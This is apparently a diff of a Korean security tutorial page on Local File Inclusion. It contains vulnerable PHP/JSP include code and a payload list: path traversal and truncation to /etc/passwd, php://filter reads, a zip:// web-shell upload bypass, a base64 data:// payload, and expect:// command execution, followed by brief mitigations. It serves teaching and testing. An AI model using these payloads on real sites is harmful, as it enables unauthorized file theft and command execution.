@@ -49,7 +49,7 @@ file을 읽은 후 이를 가져올 수 있는 구간이면 해당 취약점을 
 
 <div class="notice--primary" markdown="1">
 
-1. PHP
+- PHP
 
 ```php
 <?php
@@ -59,7 +59,7 @@ if (isset($_GET['file'])) {
 ?>
 ```
 
-2. JSP
+- JSP
 
 ```jsp
 <%
@@ -67,6 +67,8 @@ if (isset($_GET['file'])) {
    @include file="<%="includes/" + p +".jsp"%>"
 %>
 ```
+
+<hr>
 
 ```
 GET /testlfi?path=file:///etc/passwd
@@ -92,3 +94,70 @@ GET /testlfi?path=file=../../../../etc/passwd
 ```
 file=../../../../etc/passwd%00.php
 ```
+
+## Path and Dot 
+PHP 파일 이름은 4096 바이트로 제한되며, 해당 바이트보다 많은 바이트의 이름을 가지고 있다면 PHP는 파일 이름을 자르고 추가 문자를 버리게된다. 해당 방법은 오류가 발생되지 않고 정상적으로 PHP가 동작하게 된다. 이때 쓰레기 값으로 인코딩, DOUBLE 인코딩, 유니코드 인코딩 등의 값으로 채우면 된다.
+
+```
+GET /testlfi?path=file=../../../../etc/passwd...............
+GET /testlfi?path=file=../../../../etc/passwd\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\
+GET /testlfi?path=file=../../../../etc/passwd/././././././././././././././.
+GET /testlfi?path=file=../../../../../../../../../../../../../etc/passwd
+```
+
+## PHP Filter
+php의 filter은 로컬 파일 시스템에 access 하는데 사용되며, 특히 서버가 파일을 실행하지 못하게 하는 파일의 내용을 가져오는 데 악용할 수 있다.
+
+```
+http://[site]/index.php?page=php://filter/convert.base64-encode/resource=FILE
+```
+
+위와같이 보낼경우 FILE은 base64로 인코딩된 값을 받아오며, 이를 다시 디코딩하게되면 확인할 수 있다.
+
+<div class="notice">
+```php
+php://filter/convert.base64-encode/resource=FILE
+php://filter/convert.iconv.utf-8.utf-16/resource=FILE
+php://filter/convert.base64-encode/resource=FILE
+php://filter/zlib.deflate/convert.base64-encode/resource=FILE
+rot13 사용도 생각해두자.
+```
+</div>
+
+## PHP ZIP
+php filter와 같이 php의 wraper 이며, zip파일을 통한 우회가 가능하다.
+1. 원하고자 하는 php 파일 생성 ex)shell.php
+2. zip 파일로 압축 ex)target.zip
+3. zip 파일의 확장자를 jpg과 같이 변경하여 확장 유효성 검사를 우회 후 공격 대상 사이트에 업로드
+4. /test/image/upload/ 에 저장되어있을 경우 url을 통해 zip wraper을 실행
+5. zip:///test/image/upload/target.jpg%23shell.php
+
+```
+http://[site]/index.php?page=zip:///test/image/upload/target.jpg%23shell.php
+```
+
+## PHP Data Scheme
+원하고자 하는 데이터(쉘코드)를 base64로 인코딩하여 data 스킴을 사용하여 우회할 수 있다.
+> 원형 : data://text/plain;base64,BASE64_STR
+
+```
+http://[site]/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9wYXNzd2QnKTsgPz4=
+
+// base64 -> <?php echo file_get_contents('/etc/passwd'); ?>
+```
+
+## PHP expect
+해당 wrapper은 표준입출력 및 표준에러를 통해 프로세스에 대한 액세스를 제공한다. 시스템 명령을 가져올 수 있다.
+
+```
+GET /index.php?file=expect://id
+GET /index.php?file=expect://ls
+```
+
+# 대응 방안
+사용자이 입력값 검증을 통해 파일 이름의 크기범위에 대해 제한하며, 특수문자등 필터링이 적절히 이루어져야한다. 또한 URI 에 대한 화이트리스트 기반의 정책을 설정해야한다.
+
+# Referance
+- https://www.hahwul.com/cullinan/file-inclusion/
+- https://en.wikipedia.org/wiki/File_inclusion_vulnerability#Local_file_inclusion
+- https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
